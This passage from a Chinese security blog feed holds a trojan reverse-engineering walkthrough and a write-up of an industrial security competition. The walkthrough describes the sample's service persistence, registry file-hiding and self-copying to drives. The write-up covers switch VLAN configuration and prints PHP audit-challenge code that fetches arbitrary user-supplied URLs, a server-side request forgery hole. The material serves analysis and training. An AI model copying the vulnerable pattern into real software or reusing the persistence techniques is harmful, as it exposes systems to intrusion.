src="/blog/2024/12/04/%E7%97%85%E6%AF%92%E6%9C%A8%E9%A9%AC%E6%A0%B7%E6%9C%AC%E9%80%86%E5%90%91/image-20241211210118657.png" alt="image-20241211210118657"></p><p>分析函数：</p><ul><li><p>FormCreate：跟进 _TForm1_FormCreate</p><p><img src="/blog/2024/12/04/%E7%97%85%E6%AF%92%E6%9C%A8%E9%A9%AC%E6%A0%B7%E6%9C%AC%E9%80%86%E5%90%91/image-20241211210345919.png" alt="image-20241211210345919"></p><p><img src="/blog/2024/12/04/%E7%97%85%E6%AF%92%E6%9C%A8%E9%A9%AC%E6%A0%B7%E6%9C%AC%E9%80%86%E5%90%91/image-20241211210533089.png" alt="image-20241211210533089"></p><p>可以看到这里把 javasc.exe、avb.exe 注册为服务，加入自启动</p><p>跟进 sub_44F3A0 </p><p><img src="/blog/2024/12/04/%E7%97%85%E6%AF%92%E6%9C%A8%E9%A9%AC%E6%A0%B7%E6%9C%AC%E9%80%86%E5%90%91/image-20241211210847675.png" alt="image-20241211210847675"></p><p>应该是写入注册表隐藏文件不可见的代码，跟进这里的 &amp;str_HideFileExt 和 &amp;str_Hidden</p><p><img src="/blog/2024/12/04/%E7%97%85%E6%AF%92%E6%9C%A8%E9%A9%AC%E6%A0%B7%E6%9C%AC%E9%80%86%E5%90%91/image-20241211211031245.png" alt="image-20241211211031245"></p><p><img src="/blog/2024/12/04/%E7%97%85%E6%AF%92%E6%9C%A8%E9%A9%AC%E6%A0%B7%E6%9C%AC%E9%80%86%E5%90%91/image-20241211211127718.png" alt="image-20241211211127718"></p><p>于是可以得出结论：</p><p>TForm1_FormCreate 是这个病毒样本的入口函数，病毒的功能起源就是这个函数，功能是将病毒样本放置到系统盘的 Windows 目录下伪装成系统程序，将病毒文件写入到注册表中的开机自启动项里面，以实现每次开机就启动病毒样本</p></li><li><p>Timer1Timer 函数：</p><p>esc 退回到前面的函数页，跟进 _TForm1_Timer1Timer 函数</p><p><img src="/blog/2024/12/04/%E7%97%85%E6%AF%92%E6%9C%A8%E9%A9%AC%E6%A0%B7%E6%9C%AC%E9%80%86%E5%90%91/image-20241211211631344.png" alt="image-20241211211631344"></p><p>跟进 sub_44EF94</p><p><img src="/blog/2024/12/04/%E7%97%85%E6%AF%92%E6%9C%A8%E9%A9%AC%E6%A0%B7%E6%9C%AC%E9%80%86%E5%90%91/image-20241211211750291.png" alt="image-20241211211750291"></p><p>跟进 sub_44E9FC</p><p><img src="/blog/2024/12/04/%E7%97%85%E6%AF%92%E6%9C%A8%E9%A9%AC%E6%A0%B7%E6%9C%AC%E9%80%86%E5%90%91/image-20241211211938021.png" alt="image-20241211211938021"></p><p>跟进 sub_44E980</p><p><img src="/blog/2024/12/04/%E7%97%85%E6%AF%92%E6%9C%A8%E9%A9%AC%E6%A0%B7%E6%9C%AC%E9%80%86%E5%90%91/image-20241211212035879.png" alt="image-20241211212035879"></p><p>可以看到这里通过 Sysutils::DiskSize 获取磁盘大小来判断磁盘是否存在</p><p>然后回到上一级 sub_44E9FC</p><p><img src="/blog/2024/12/04/%E7%97%85%E6%AF%92%E6%9C%A8%E9%A9%AC%E6%A0%B7%E6%9C%AC%E9%80%86%E5%90%91/image-20241211212145672.png" alt="image-20241211212145672"></p><p>接下来调用 GetDriveTypeA 判断磁盘类型</p><p>然后退出 sub_44E9FC，进入 sub_44EEBC 函数</p><p><img src="/blog/2024/12/04/%E7%97%85%E6%AF%92%E6%9C%A8%E9%A9%AC%E6%A0%B7%E6%9C%AC%E9%80%86%E5%90%91/image-20241211212424469.png" alt="image-20241211212424469"></p><p><img src="/blog/2024/12/04/%E7%97%85%E6%AF%92%E6%9C%A8%E9%A9%AC%E6%A0%B7%E6%9C%AC%E9%80%86%E5%90%91/image-20241211212452460.png" alt="image-20241211212452460"></p><p>先跟进 sub_44EAA4</p><p><img src="/blog/2024/12/04/%E7%97%85%E6%AF%92%E6%9C%A8%E9%A9%AC%E6%A0%B7%E6%9C%AC%E9%80%86%E5%90%91/image-20241211212655513.png" alt="image-20241211212655513"></p><p>这里的操作主要是文件的遍历</p><p>然后看 sub_44EC88</p><p><img src="/blog/2024/12/04/%E7%97%85%E6%AF%92%E6%9C%A8%E9%A9%AC%E6%A0%B7%E6%9C%AC%E9%80%86%E5%90%91/image-20241211212800753.png" alt="image-20241211212800753"></p><p>主要是设置文件属性，随后进行了一个对自身的拷贝</p></li></ul>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;🐎&lt;/p&gt;</summary>
    
    
    
    <category term="Rev" scheme="http://c1oudfl0w0.github.io/blog/categories/Rev/"/>
    
    
  </entry>
  
  <entry>
    <title>2024工业互联网安全决赛</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/11/28/2024%E5%B7%A5%E4%B8%9A%E4%BA%92%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/11/28/2024%E5%B7%A5%E4%B8%9A%E4%BA%92%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8/</id>
    <published>2024-11-28T00:59:52.000Z</published>
    <updated>2024-12-06T15:59:09.776Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>赛制是 理论 + 工控ctf + 渗透or运维build</p><p>理论赛本地大模型魅力时刻</p><p>ctf 部分上来先考计算机网络&#x2F;路由交换实践，而我还在重修计网，令人感叹（</p><p>然后用 ctf 的分换取渗透&#x2F;build启动环境的机会，渗透每次启动环境都只有一小时的时间能打，只能说根本打不完555</p><p><img src="/blog/2024/11/28/2024%E5%B7%A5%E4%B8%9A%E4%BA%92%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8/image-20241128171247204.png" alt="image-20241128171247204"></p><span id="more"></span><hr><p>设备如下，是西门子的，交换机是tplink的，比赛的时候显示器接的是 SCADA：</p><p><img src="/blog/2024/11/28/2024%E5%B7%A5%E4%B8%9A%E4%BA%92%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8/1733190508111.jpg" alt="1733190508111"></p><h1 id="任务一：网络拓扑构建"><a href="#任务一：网络拓扑构建" class="headerlink" title="任务一：网络拓扑构建"></a>任务一：网络拓扑构建</h1><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">以本机能够ping通192.168.N.86成功为标准构建拓扑（N是自己队伍的C段）<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>安装所给的console驱动</p><p>笔记本 usb 插 console 线，另一头插交换机的 console 口进行连接，xshell用 SERIAL 协议连接 COM7 口（在设备管理器-端口处查看对应的端口）</p><p><img src="/blog/2024/11/28/2024%E5%B7%A5%E4%B8%9A%E4%BA%92%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8/image-20241203141901391.png" alt="image-20241203141901391"></p><p>波特率设置为主办方提供的38400，设备管理器那边也要设置为38400（波特率不对会没有输入输出）</p><p><img src="/blog/2024/11/28/2024%E5%B7%A5%E4%B8%9A%E4%BA%92%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8/image-20241203142021367.png" alt="image-20241203142021367"></p><p>然后就能连上</p><p>拓扑图：</p><p><img src="/blog/2024/11/28/2024%E5%B7%A5%E4%B8%9A%E4%BA%92%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8/image-20241128120244671.png" alt="image-20241128120244671"></p><p>console连上交换机2进行配置，键入<code>?</code>可以查看可用命令和帮助，tab可以补全，删除字符要用del：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">TL-SG521<span class="token operator"><span class="token file-descriptor important">0</span>></span> broadcast            - Write message to all <span class="token function">users</span> logged in,at <span class="token function">most</span> <span class="token number">256</span>                         characters <span class="token builtin class-name">enable</span>               - Enter Privileged EXEC Mode <span class="token function">ping</span>                 - Ping <span class="token builtin class-name">command</span> tracert              - Tracet route to destination <span class="token builtin class-name">exit</span>                 - Exit current modeTL-SG521<span class="token operator"><span class="token file-descriptor important">0</span>></span>enableTL-SG5210<span class="token comment">#</span> broadcast            - Write message to all <span class="token function">users</span> logged in,at <span class="token function">most</span> <span class="token number">256</span>                         characters configure            - Enter Global Configuration Mode copy                 - Config <span class="token function">file</span> commands debug                - Debugging commands enable-admin         - Achieve the admin privilege firmware             - Firmware commands <span class="token builtin class-name">logout</span>               - Logout the system <span class="token function">ping</span>                 - Ping <span class="token builtin class-name">command</span> <span class="token function">reboot</span>               - Reboot the system remove               - Config <span class="token function">file</span> commands reset                - Reset the system tracert              - Tracet route to destination <span class="token function">clear</span>                - Reset functions <span class="token builtin class-name">exit</span>                 - Exit current mode show                 - Display system information TL-SG5210<span class="token comment">#ping 192.168.52.86</span>Pinging <span class="token number">192.168</span>.52.86 with <span class="token number">64</span> bytes of data <span class="token builtin class-name">:</span>Destination Host Unreachable<span class="token operator">!</span>Destination Host Unreachable<span class="token operator">!</span>Destination Host Unreachable<span class="token operator">!</span>Destination Host Unreachable<span class="token operator">!</span>Ping statistics <span class="token keyword">for</span> <span class="token number">192.168</span>.52.86:    Packets: Sent <span class="token operator">=</span> <span class="token number">0</span> , Received <span class="token operator">=</span> <span class="token number">0</span> , Lost <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">(</span><span class="token number">0</span>% loss<span class="token punctuation">)</span>Approximate round trip <span class="token builtin class-name">times</span> <span class="token keyword">in</span> milli-seconds:Minimum <span class="token operator">=</span> 0ms , Maximum <span class="token operator">=</span> 0ms , Average <span class="token operator">=</span> 0msTL-SG5210<span class="token comment">#enable-admin</span>Authentication fail. You should <span class="token builtin class-name">enable</span> AAA first.Error password<span class="token operator">!</span>TL-SG5210<span class="token comment">#configure</span>TL-SG5210<span class="token punctuation">(</span>config<span class="token punctuation">)</span><span class="token comment">#</span> aaa                  - Authentication Authorization Accounting commands access-list          - Create a temporary Access-List entry arp                  - Address Resolution Protocol <span class="token punctuation">(</span>ARP<span class="token punctuation">)</span> boot                 - Boot configuration cloud-server         - Config Cloud Server status contact-info         - Contact information dns                  - Configure domain name system dot1q-tunnel         - Dot1q-tunnel configuration dot1x                - Globally Enable <span class="token number">802</span>.1x feature <span class="token builtin class-name">enable</span>               - Configure <span class="token builtin class-name">enable</span> password gvrp                 - GVRP global configuration holiday              - Configure the holiday <span class="token function">time</span> range <span class="token function">hostname</span>             - System name interface            - Select an interface to configure <span class="token function">ip</span>                   - IP address commands ipv6                 - Internet Protocol version <span class="token number">6</span> <span class="token punctuation">(</span>IPv6<span class="token punctuation">)</span> lacp                 - Configure LACP global system priority line                 - Enter Line Configuration Mode lldp                 - Configure LLDP global subcommands location             - System location logging              - System log configuration loopback-detection   - Enable loopback-detection mac                  - Global Bridge table configuration commands mac-vlan             - Configure a MAC-based VLAN entry monitor              - Monitoring different system events port-channel         - EtherChannel configuration protocol-vlan        - Protocol VLAN commands qos                  - Configure quality of <span class="token function">service</span> <span class="token punctuation">(</span>QoS<span class="token punctuation">)</span> on the device radius-server        - Modify RADIUS query parameters rmon                 - SNMP RMON configuration router               - router <span class="token function">service</span>              - Change Service state snmp-server          - SNMP server configuration spanning-tree        - Configure Spanning Tree Subsystem system-time          - System-time configuration tacacs-server        - Modify TACACS query parameters telnet               - Telnet configuration time-range           - Configure the <span class="token function">time</span> range  ucl                  - UCL commands user                 - Add a new user or modify an exist user vlan                 - VLAN commands voice                - Voice VLAN global commands <span class="token function">clear</span>                - Reset functions end                  - Return to Privileged EXEC Mode <span class="token builtin class-name">exit</span>                 - Exit current mode no                   - Negate <span class="token builtin class-name">command</span> show                 - Display system information TL-SG5210<span class="token punctuation">(</span>config<span class="token punctuation">)</span><span class="token comment">#interface </span> fastEthernet         - FastEthernet IEEE <span class="token number">802.3</span> gigabitEthernet      - GigabitEthernet IEEE <span class="token number">802</span>.3z loopback             - Loopback interface port-channel         - Ethernet Channel of interfaces range                - Interface Range Mode ten-gigabitEthernet  - Ten-GigabitEthernet IEEE <span class="token number">802</span>.3ae vlan                 - Interface VLAN Mode<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>那么就是要在config模式下对交换机路由进行配置，测试发现<code>interface gigabitEthernet 1/0/2</code>进入 config-if 模式下配不了 ip 地址</p><p>先看一下现有的路由配置</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">TL-SG5210<span class="token comment">#show </span> aaa                  - Display the AAA configuration access-list          - Display ACL information arp                  - Display ARP information bandwidth            - Display bandwidth rate configuration boot                 - Display the boot configuration cable-diagnostics    - Display Cable diagnostics results cloud-server         - cloud-server  cluster              - Display cluster information cpu-utilization      - Display CPU utilization debugging            - Dispaly modules debug status dot1q-tunnel         - Display VLAN VPN configuration dot1x                - Display <span class="token number">802</span>.1x configuration information etherchannel         - Display EtherChannel information gvrp                 - Display GVRP information <span class="token function">history</span>              - Display <span class="token builtin class-name">command</span> <span class="token function">history</span> holiday              - Display holiday information image-info           - Display the image info interface            - Display interface status and configuration <span class="token function">ip</span>                   - Display IP information ipv6                 - Internet Protocol version <span class="token number">6</span> <span class="token punctuation">(</span>IPv6<span class="token punctuation">)</span> lacp                 - Display LACP configuration lldp                 - Display LLDP information logging              - Display log information loopback-detection   - Display loopback detection information mac                  - Display mac information mac-vlan             - Display MAC Based VLAN information memory-utilization   - Display memory utilization monitor              - Display monitor sessions information port                 - Display Ethernet port configuration protocol-vlan        - Display protocol VLAN configuration qos                  - Display QoS related information radius-server        - Show radius server information rmon                 - Display SNMP RMON information running-config       - Display running config snmp-server          - Display SNMP related information spanning-tree        - Display spanning tree information startup-config       - Display startup config storm-control        - Display interface's storm-control configuration system-info          - Display system information system-time          - Display current system <span class="token function">time</span> information tacacs-server        - Show tacacs+ server information telnet-status        - Display telnet status time-range           - Display <span class="token function">time</span> segment information ucl                  - Display UCL information user                 - Display user account information vlan                 - Display VLAN information voice                - Display voice VLAN configurationTL-SG5210<span class="token comment">#show ip interface </span> brief                - Brief summary of IP status and configuration fastEthernet         - FastEthernet IEEE <span class="token number">802.3</span> gigabitEthernet      - GigabitEthernet IEEE <span class="token number">802</span>.3z loopback             - Loopback interface port-channel         - Ethernet Channel of interfaces ten-gigabitEthernet  - Ten-GigabitEthernet IEEE <span class="token number">802</span>.3ae vlan                 - VLAN interface <span class="token operator">&lt;</span>cr<span class="token operator">></span>TL-SG5210<span class="token comment">#show ip interface brief </span> Interface             IP-Address          Method  Status  Protocol  Shutdown ---------             ----------          ------  ------  --------  -------- Vlan1                 <span class="token number">192.168</span>.0.1/24      Static  up      up        no<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>config 模式下启用AAA</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">TL-SG5210<span class="token punctuation">(</span>config<span class="token punctuation">)</span><span class="token comment">#aaa </span> accounting           - Configure accounting method list authentication       - Configure authentication method list <span class="token builtin class-name">enable</span>               - Enable AAA group                - Configure AAA groupTL-SG5210<span class="token punctuation">(</span>config<span class="token punctuation">)</span><span class="token comment">#aaa enable</span>TL-SG5210<span class="token punctuation">(</span>config<span class="token punctuation">)</span><span class="token comment">#exit</span>TL-SG5210<span class="token comment">#enable-admin</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>接下来结合这张表配置 vlan</p><p><img src="/blog/2024/11/28/2024%E5%B7%A5%E4%B8%9A%E4%BA%92%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8/image-20241203143852945.png" alt="image-20241203143852945"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">TL-SG5210<span class="token punctuation">(</span>config<span class="token punctuation">)</span><span class="token comment">#interface </span> fastEthernet         - FastEthernet IEEE <span class="token number">802.3</span> gigabitEthernet      - GigabitEthernet IEEE <span class="token number">802</span>.3z loopback             - Loopback interface port-channel         - Ethernet Channel of interfaces range                - Interface Range Mode ten-gigabitEthernet  - Ten-GigabitEthernet IEEE <span class="token number">802</span>.3ae vlan                 - Interface VLAN ModeTL-SG5210<span class="token punctuation">(</span>config<span class="token punctuation">)</span><span class="token comment">#interface vlan                                               </span> <span class="token operator">&lt;</span><span class="token number">1</span>-409<span class="token operator"><span class="token file-descriptor important">4</span>></span>             - VLAN interface number TL-SG5210<span class="token punctuation">(</span>config<span class="token punctuation">)</span><span class="token comment">#interface vlan 4</span>TL-SG5210<span class="token punctuation">(</span>config-if<span class="token punctuation">)</span><span class="token comment">#</span> access-list          - Configure the access list control module arp                  - Address Resolution Protocol <span class="token punctuation">(</span>ARP<span class="token punctuation">)</span> description          - Specify vlan interface description <span class="token function">ip</span>                   - Configure interface internet protocol ipv6                 - IPv6 interface subcommands <span class="token function">shutdown</span>             - Shutdown the selected interface <span class="token function">clear</span>                - Reset functions end                  - Return to Privileged EXEC Mode <span class="token builtin class-name">exit</span>                 - Exit current mode no                   - Negate <span class="token builtin class-name">command</span> show                 - Display system information TL-SG5210<span class="token punctuation">(</span>config-if<span class="token punctuation">)</span><span class="token comment">#ip </span> address              - Set IP address manually address-alloc        - Set IP address by bootp or dhcp helper-address       - Specify a destination address <span class="token keyword">for</span> DHCP broadcasts local-proxy-arp      - Specify <span class="token builtin class-name">local</span> proxy ARP configuration proxy-arp            - Specify proxy ARP configuration rip                  - Specify RIP protocol interface configurationTL-SG5210<span class="token punctuation">(</span>config-if<span class="token punctuation">)</span><span class="token comment">#ip address</span>address             address-alloc       TL-SG5210<span class="token punctuation">(</span>config-if<span class="token punctuation">)</span><span class="token comment">#ip address 192.168.52.86 </span> A.B.C.D              - Specify the IP subnet maskTL-SG5210<span class="token punctuation">(</span>config-if<span class="token punctuation">)</span><span class="token comment">#ip address 192.168.52.86 255.255.255.0</span>TL-SG5210<span class="token punctuation">(</span>config-if<span class="token punctuation">)</span><span class="token comment">#no shutdown </span><span class="token function">shutdown</span>            <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这样就配置完成了，然后把电脑的网线另一头从hub上拔下来接到交换机的 lan 口上就能ping通了</p><hr><h1 id="任务二：交换机配置（Unsolved）"><a href="#任务二：交换机配置（Unsolved）" class="headerlink" title="任务二：交换机配置（Unsolved）"></a>任务二：交换机配置（Unsolved）</h1><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">对竞赛平台中的网络设备进行配置，完成该任务应能够实现以下效果：1. 工业防火墙、工业日志审计的管理口同处于交换机 SW1 的 VLAN 5 下，操作人员可通过桌面 Hub 访问 MES 的 Web 页面，通过 G1/0/3 访问工业日志审计管理页面、工业防火墙管理页面。2. SCADA、HMI 同处于 VLAN 下，操作人员可通过 SCADA 访问 MES 的 web 页面。3. 通过工业日志审计能够监控流经交换机 SW1 和交换机 SW2 的所有流量数据。4. 将交换机 1 的 G1/0/8 的 IP 地址配置为 12.0.N.254/24。5. 添加静态路由 171.16.0.0/16，网关为 12.0.N.1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>直接把console线插到交换机1上，用同样的方式配置 vlan5，使其能够通过网线访问工业防火墙、工业日志审计</p><p><img src="/blog/2024/11/28/2024%E5%B7%A5%E4%B8%9A%E4%BA%92%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8/image-20241128150333714.png" alt="image-20241128150333714"></p><p><img src="/blog/2024/11/28/2024%E5%B7%A5%E4%B8%9A%E4%BA%92%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8/image-20241128150413106.png" alt="image-20241128150413106"></p><p>但是还差一个 通过桌面 Hub 访问 MES 的 Web 页面</p><p>hint：MES的web服务开在不常见端口</p><p>于是把65535全扫了一遍。。然后没扫到，不知道怎么搞的</p><hr><h1 id="任务十三：代码安全审计"><a href="#任务十三：代码安全审计" class="headerlink" title="任务十三：代码安全审计"></a>任务十三：代码安全审计</h1><p>对以下这段代码进行安全审计：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REQUEST_METHOD'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'POST'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$url</span> <span class="token operator">=</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">filter_var</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">,</span> <span class="token constant">FILTER_VALIDATE_URL</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$error</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"无效的 URL，请检查格式。"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_FOLLOWLOCATION</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_MAXREDIRS</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$response</span> <span class="token operator">=</span> <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$response</span> <span class="token operator">===</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$error</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'cURL 错误: '</span> <span class="token operator">.</span> <span class="token function">curl_error</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>zh<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>危化品处理系统<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">        <span class="token selector">body</span> <span class="token punctuation">&#123;</span>            <span class="token property">font-family</span><span class="token punctuation">:</span> Arial<span class="token punctuation">,</span> sans-serif<span class="token punctuation">;</span>            <span class="token property">background-color</span><span class="token punctuation">:</span> #f5f5f5<span class="token punctuation">;</span>            <span class="token property">margin</span><span class="token punctuation">:</span> 0<span class="token punctuation">;</span>            <span class="token property">padding</span><span class="token punctuation">:</span> 0<span class="token punctuation">;</span>            <span class="token property">display</span><span class="token punctuation">:</span> flex<span class="token punctuation">;</span>            <span class="token property">justify-content</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span>            <span class="token property">align-items</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span>            <span class="token property">height</span><span class="token punctuation">:</span> 100vh<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token selector">.container</span> <span class="token punctuation">&#123;</span>            <span class="token property">background-color</span><span class="token punctuation">:</span> white<span class="token punctuation">;</span>            <span class="token property">padding</span><span class="token punctuation">:</span> 20px<span class="token punctuation">;</span>            <span class="token property">border-radius</span><span class="token punctuation">:</span> 8px<span class="token punctuation">;</span>            <span class="token property">box-shadow</span><span class="token punctuation">:</span> 0 0 10px <span class="token function">rgba</span><span class="token punctuation">(</span>0<span class="token punctuation">,</span> 0<span class="token punctuation">,</span> 0<span class="token punctuation">,</span> 0.1<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token property">width</span><span class="token punctuation">:</span> 400px<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token selector">h1</span> <span class="token punctuation">&#123;</span>            <span class="token property">text-align</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token selector">label</span> <span class="token punctuation">&#123;</span>            <span class="token property">font-size</span><span class="token punctuation">:</span> 14px<span class="token punctuation">;</span>            <span class="token property">margin-bottom</span><span class="token punctuation">:</span> 8px<span class="token punctuation">;</span>            <span class="token property">display</span><span class="token punctuation">:</span> block<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token selector">input[type="text"]</span> <span class="token punctuation">&#123;</span>            <span class="token property">width</span><span class="token punctuation">:</span> 100%<span class="token punctuation">;</span>            <span class="token property">padding</span><span class="token punctuation">:</span> 10px<span class="token punctuation">;</span>            <span class="token property">margin-bottom</span><span class="token punctuation">:</span> 15px<span class="token punctuation">;</span>            <span class="token property">border</span><span class="token punctuation">:</span> 1px solid #ccc<span class="token punctuation">;</span>            <span class="token property">border-radius</span><span class="token punctuation">:</span> 4px<span class="token punctuation">;</span>            <span class="token property">box-sizing</span><span class="token punctuation">:</span> border-box<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token selector">.btn</span> <span class="token punctuation">&#123;</span>            <span class="token property">width</span><span class="token punctuation">:</span> 100%<span class="token punctuation">;</span>            <span class="token property">padding</span><span class="token 